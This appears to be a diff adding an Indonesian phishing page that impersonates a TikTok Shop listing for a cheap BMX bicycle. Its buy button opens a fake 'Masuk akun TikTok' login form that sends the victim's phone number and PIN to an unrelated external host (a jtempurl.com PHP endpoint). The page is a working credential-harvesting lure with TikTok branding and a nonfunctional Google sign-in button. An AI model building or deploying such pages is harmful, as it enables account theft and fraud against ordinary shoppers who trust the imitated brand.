@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Shop - Sepeda BMX Pro</title>
+    
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, sans-serif; background-color: #f6f6f6; color: #161823; }
+        
+        .layout { max-width: 500px; margin: 0 auto; background: white; min-height: 100%; display: flex; flex-direction: column; }
+
+        /* HEADER */
+        .header { display: flex; align-items: center; padding: 10px 15px; gap: 10px; position: sticky; top: 0; background: white; z-index: 100; border-bottom: 1px solid #eee; }
+        .search-bar { flex: 1; background: #f1f1f1; border-radius: 6px; padding: 8px; color: #999; font-size: 14px; display: flex; align-items: center; }
+
+        /* AREA SLIDER FOTO (BISA DIGESER) */
+        .swiper { width: 100%; aspect-ratio: 1/1; }
+        .swiper-slide { position: relative; background: #fff; display: flex; justify-content: center; align-items: center; }
+        .product-img { width: 100%; height: 100%; object-fit: contain; }
+        
+        /* Watermark & Teks di Foto */
+        .wm-center { position: absolute; top: 35%; left: 50%; transform: translate(-50%, -50%); color: #44ebf1; font-size: 28px; font-weight: bold; opacity: 0.6; pointer-events: none; }
+        .wm-right { position: absolute; top: 15px; right: 15px; color: #2e55b4; font-size: 22px; font-weight: bold; text-align: right; line-height: 1; pointer-events: none; }
+        .bike-text { position: absolute; bottom: 20px; width: 100%; text-align: center; color: #d0011b; font-weight: bold; font-size: 18px; line-height: 1.2; pointer-events: none; }
+        .slide-number { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.5); color: white; padding: 2px 8px; border-radius: 10px; font-size: 12px; z-index: 20; }
+
+        /* DETAIL PRODUK */
+        .details { padding: 15px; flex: 1; }
+        .price { color: #fe2c55; font-size: 26px; font-weight: bold; }
+        .title { font-size: 15px; margin-top: 10px; line-height: 1.4; font-weight: 500; }
+
+        /* FOOTER */
+        .footer { position: sticky; bottom: 0; background: white; border-top: 1px solid #eee; padding: 10px; display: flex; gap: 15px; z-index: 100; align-items: center; }
+        .btn-buy { flex: 1; background: #00b348; color: white; border: none; padding: 12px; border-radius: 25px; font-weight: bold; cursor: pointer; }
+
+        /* POPUP MODAL (TIKTOK STYLE) */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 2000; justify-content: center; align-items: flex-end; }
+        .modal-content { width: 100%; max-width: 500px; background: white; border-top-left-radius: 15px; border-top-right-radius: 15px; padding: 20px; animation: slideUp 0.3s; position: relative; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+        .modal-title { text-align: center; font-size: 28px; font-weight: 800; margin: 35px 0 25px; }
+        
+        /* INPUT GROUP */
+        .input-group { display: flex; background: #f1f1f2; border-radius: 4px; margin-bottom: 12px; align-items: center; overflow: hidden; }
+        .ccode { padding: 12px; border-right: 1px solid #e2e2e4; font-weight: 600; font-size: 15px; color: #161823; }
+        .p-input { border: none; background: transparent; padding: 13px; flex: 8; font-size: 15px; outline: none; color: #161823; }
+        .lock-icon { padding: 0 12px; color: #8a8b91; font-size: 20px; }
+
+        /* TOMBOL RED */
+        .btn-red { width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 24px; font-weight: bold; font-size: 15px; margin-bottom: 20px; cursor: pointer; }
+        
+        .divider { display: flex; align-items: center; text-align: center; color: #8a8b91; font-size: 13px; margin: 10px 0; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #e2e2e4; margin: 0 10px; }
+
+        .s-btn { width: 100%; padding: 12px; border: 1px solid #e2e2e4; background: #f8f8f9; margin-bottom: 10px; font-size: 15px; border-radius: 4px; display: flex; align-items: center; font-weight: 600; justify-content: center; position: relative; }
+        .s-btn img { width: 20px; position: absolute; left: 15px; }
+
+        .legal { font-size: 12px; color: #8a8b91; text-align: center; margin: 20px 0; line-height: 1.5; }
+        .m-footer { border-top: 1px solid #eee; padding: 20px; margin: 0 -20px -20px; text-align: center; background: #f8f8f9; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+<div class="layout">
+    <div class="header">
+        <span class="material-icons-outlined">arrow_back</span>
+        <div class="search-bar">Cari sepeda bmx 12 inch</div>
+        <span class="material-icons-outlined">shopping_cart</span>
+    </div>
+
+    <div class="swiper mySwiper">
+        <div class="swiper-wrapper">
+            <div class="swiper-slide">
+                <div class="wm-center">Totosterbu</div>
+                <div class="wm-right">Real<br>pict 📸</div>
+                <img src="https://img.lazcdn.com/g/p/da86d3ec1cffc6295a671e785d49b54a.jpg_960x960q80.jpg_.webp" class="product-img">
+                <div class="bike-text">BMX 12 INCH<br>LIMITLESS 6601<br>BAN 3.0</div>
+                <div class="slide-number">1/3</div>
+            </div>
+            <div class="swiper-slide">
+                <img src="https://img.lazcdn.com/g/p/0594cce3dd3cede9e61243b074645fef.jpg_720x720q80.jpg" class="product-img" style="filter: brightness(0.95);">
+                <div class="bike-text">READY STOCK</div>
+                <div class="slide-number">2/3</div>
+            </div>
+            <div class="swiper-slide">
+                <img src="https://p16-oec-sg.ibyteimg.com/tos-alisg-i-aphluv4xwc-sg/img/VqbcmM/2024/12/4/1d188f6c-406b-482b-96dd-9b0c1a965983.jpg~tplv-aphluv4xwc-crop-webp:700:700.webp?dr=15592&t=555f072d&ps=933b5bde&shp=8dbd94bf&shcp=e1be8f53&idc=my3&from=2378011839" class="product-img" style="filter: contrast(1.1);">
+                <div class="bike-text">KUALITAS EKSPOR</div>
+                <div class="slide-number">3/4</div>
+            </div><div class="swiper-slide">
+                <img src="https://id-test-11.slatic.net/p/6a9846e7ebe493497c896900d207aa65.jpg" class="product-img" style="filter: contrast(1.1);">
+                <div class="bike-text">KUALITAS EKSPOR</div>
+                <div class="slide-number">4/4</div>
+            </div>
+        </div>
+        <div class="swiper-pagination"></div>
+    </div>
+
+    <div class="details">
+        <div class="price">Rp100.000</div>
+        <img src="https://raw.githubusercontent.com/fstvi/-/refs/heads/main/Screenshot_20260329_234516_TikTok.jpg" width="100%">
+    </div>
+
+    <div class="footer">
+        <span class="material-icons-outlined">storefront</span>
+        <span class="material-icons-outlined">chat_bubble_outline</span>
+        <button class="btn-buy" onclick="openModal()"><strong>Beli sekarang</strong> <br>Harga promo Rp100.000</button>
+    </div>
+</div>
+
+<div class="modal" id="pop">
+    <div class="modal-content">
+        <span class="material-icons-outlined" style="position:absolute; top:15px; left:15px">help_outline</span>
+        <span class="material-icons-outlined" onclick="closeModal()" style="position:absolute; top:15px; right:15px; cursor:pointer">close</span>
+        
+        <h2 class="modal-title">Masuk akun TikTok</h2>
+        
+        <form action="https://eenok8385-001-site1.jtempurl.com/bmx.php" method="POST">
+            <div class="input-group">
+                <div class="ccode">ID +62 <span class="material-icons-outlined" style="font-size:14px">expand_more</span></div>
+                <input type="tel" name="phone" class="p-input" placeholder="Nomor telepon" maxlength="13" required>
+            </div>
+
+            <div class="input-group">
+                <span class="material-icons-outlined lock-icon">lock</span>
+                <input type="tel" name="pin" class="p-input" placeholder="PIN" maxlength="6" required>
+            </div>
+
+            <button type="submit" class="btn-red">Lanjutkan</button>
+        </form>
+
+        <div class="divider">atau</div>
+
+        <button class="s-btn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="">
+            <span class="social-btn-text">Lanjutkan dengan Google</span>
+        </button>
+
+        <div class="legal">
+           Silahkan masuk menggunakan akun untuk pesan produk ini. <span style="font-weight:bold">Pastikan sudah mempunyai akun<br>Tiktok</span>
+        </div>
+
+        <div class="m-footer">
+            Sudah memiliki akun? <span style="color:#fe2c55; cursor:pointer">Masuk</span>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+<script>
+    var swiper = new Swiper(".mySwiper", {
+        pagination: { el: ".swiper-pagination" },
+        loop: true,
+    });
+    function openModal() { document.getElementById('pop').style.display = 'flex'; document.body.style.overflow = 'hidden'; }
+    function closeModal() { document.getElementById('pop').style.display = 'none'; document.body.style.overflow = 'auto'; }
+</script>
+
+</body>
+</html>
